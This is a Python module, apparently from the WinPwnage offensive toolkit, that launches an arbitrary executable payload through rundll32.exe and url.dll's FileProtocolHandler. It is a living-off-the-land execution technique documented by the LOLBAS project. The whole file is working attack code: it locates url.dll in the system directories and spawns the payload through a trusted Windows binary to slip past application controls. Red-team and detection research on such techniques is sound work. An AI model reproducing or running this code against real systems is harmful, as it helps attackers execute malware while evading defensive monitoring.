import os
import random
from winpwnage.core.prints import *
from winpwnage.core.utils import *
from winpwnage.core.winstructures import *

#https://lolbas-project.github.io/lolbas/Libraries/Url/

url_info = {
	"Description": "Launch an executable payload by calling OpenURL in url.dll",
	"Id": "13",
	"Type": "Execution",
	"Fixed In": "99999",
	"Works From": "7600",
	"Admin": False,
	"Function Name": "exec_url",
	"Function Payload": True,
}


def exec_url(payload):
	if payloads().exe(payload):
		paths = []		
		dll = "url.dll"
		binary = "rundll32.exe"

		print_info("Searching for ({dll}) in system32 and syswow64".format(dll=dll))
		for root, dirs, files in os.walk(information().windows_directory()):	
			for name in files:
				if name.lower() == dll:
					if "system32" in root.lower() or "syswow64" in root.lower():
						paths.append(os.path.join(root, name))

		try:
			path = random.choice(paths)
		except IndexError:
			print_error("Unable to proceed, ({dll}) not found on system".format(dll=dll))
			return False
		else:
			print_info("Attempting to launch {payload} using ({binary}) binary".format(payload=payload,binary=binary))
			exit_code = process().create(binary,
						params="{dll},FileProtocolHandler {payload}".format(dll=dll,payload=payload),
						get_exit_code=True)

			if exit_code == 0:
				print_success("Successfully created process ({}) exit code ({})".format(payload, exit_code))
			else:
				print_error("Unable to create process ({}) exit code ({})".format(payload, exit_code))
				return False